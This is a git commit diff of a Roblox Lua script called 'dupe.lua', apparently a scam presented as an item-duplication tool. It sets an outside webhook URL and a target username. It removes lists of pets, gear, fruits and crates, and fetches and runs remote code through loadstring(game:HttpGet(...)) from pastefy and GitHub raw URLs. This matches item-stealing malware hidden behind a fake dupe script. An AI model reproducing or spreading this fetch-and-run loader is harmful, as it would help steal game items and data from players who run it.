12d251292f702b2e7783d2dad76395148f39a337
ZAmbuluda <levraimlk78@gmail.com>
2026-06-16 15:11:07 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -3,83 +3,8 @@ getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=uOz1aJY9MHtUPYp"
 getgenv().TARGET_USERNAME = "Hakimidu_95"
 
 
-
-getgenv().TARGET_PETS = {
-    "Frog",
-    "Bunny",
-    "Owl",
-    "Deer",
-    "Robin",
-    "Bee",
-    "Monkey",
-    "Golden Dragonfly",
-    "Unicorn",
-    "Raccoon",
-    "Black Dragon",
-    "Ice Serpent"
-}
-
-
-getgenv().TARGET_GEAR = {
-    "Common Watering Can",
-    "Common Sprinkler",
-    "Uncommon Sprinkler",
-    "Trowel",
-    "Rare Sprinkler",
-    "Jump Mushroom",
-    "Speed Mushroom",
-    "Shrink Mushroom",
-    "Supersize Mushroom",
-    "Gnome",
-    "Basic Pot",
-    "Legendary Sprinkler",
-    "Invisibility Mushroom",
-    "Super Watering Can",
-    "Super Sprinkler"
-}
-
-
-getgenv().FRUITS = {
-    "Bamboo",
-    "Mushroom",
-    "Mango",
-    "Grape",
-    "Dragon Fruit",
-    "Cherry",
-    "Acorn",
-    "Sunflower",
-    "Venus Fly Trap",
-    "Pomegranate",
-    "Gold",
-    "Poision Apple",
-    "Moon Bloom",
-    "Dragon's Breath",
-    "Poison Ivy",
-    "Ghost Pepper",
-    "Rainbow"
-}
-
-
-getgenv().CRATES = {
-    "Ladder Crate",
-    "Bench Crate",
-    "Light Crate",
-    "Sign Crate",
-    "Arch Crate",
-    "Roleplay Crate",
-    "Bridge Crate",
-    "Spring Crate",
-    "Seesaw Crate",
-    "Conveyor Crate",
-    "Owner Door Crate",
-    "Bear Trap Crate",
-    "Fence Crate",
-    "Teleporter Pad Crate"
-}
-
-
 task.spawn(function()
-   loadstring(game:HttpGet("https://pastefy.app/xTAM3PgD/raw"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/GAG2MAIN/refs/heads/main/main.lua"))()
 end)
 task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()
